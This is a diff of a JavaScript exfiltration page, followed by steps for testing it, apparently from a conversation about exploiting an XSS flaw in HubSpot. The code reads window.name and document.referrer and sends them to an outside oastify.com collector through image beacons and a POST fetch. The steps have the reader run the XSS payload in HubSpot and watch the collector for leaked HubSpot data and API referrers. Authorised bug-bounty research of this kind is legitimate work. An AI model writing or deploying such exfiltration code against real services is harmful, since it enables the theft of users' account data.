@@ -10,19 +10,38 @@ const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
 // Read window.name (persists across navigations!)
 const data = window.name;
 
-document.getElementById('data').innerHTML = 'Received: ' + data;
+document.getElementById('data').innerHTML = 'Received window.name: ' + data;
 
-// Exfiltrate
-new Image().src = EXFIL + '/received?data=' + encodeURIComponent(data);
+// Exfiltrate to Burp Collaborator
+new Image().src = EXFIL + '/?WINDOWNAME=' + encodeURIComponent(data);
 
-// Also check if we have a referrer
-new Image().src = EXFIL + '/referrer?ref=' + encodeURIComponent(document.referrer);
+// Also send referrer
+new Image().src = EXFIL + '/?referrer=' + encodeURIComponent(document.referrer);
 
-// Try to read any URL parameters
-const params = new URLSearchParams(window.location.search);
-for (let [key, value] of params) {
-    new Image().src = EXFIL + '/param?k=' + encodeURIComponent(key) + '&v=' + encodeURIComponent(value);
-}
+// Send as POST too
+fetch(EXFIL + '/windowname', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: JSON.stringify({
+        name: data,
+        referrer: document.referrer,
+        timestamp: new Date().toISOString()
+    })
+});
 </script>
 </body>
 </html>
+```
+
+---
+
+## **Now Test It:**
+
+1. **Push both files to GitHub**
+2. **Run your XSS payload in HubSpot**
+3. **Click the button**
+4. **Watch Burp Collaborator for:**
+```
+/?s=... (all the sandbox logs)
+/?WINDOWNAME=hubspot_data_XXXXXXXX
+/?referrer=https://api.hubapi.com/account-info/v3/details
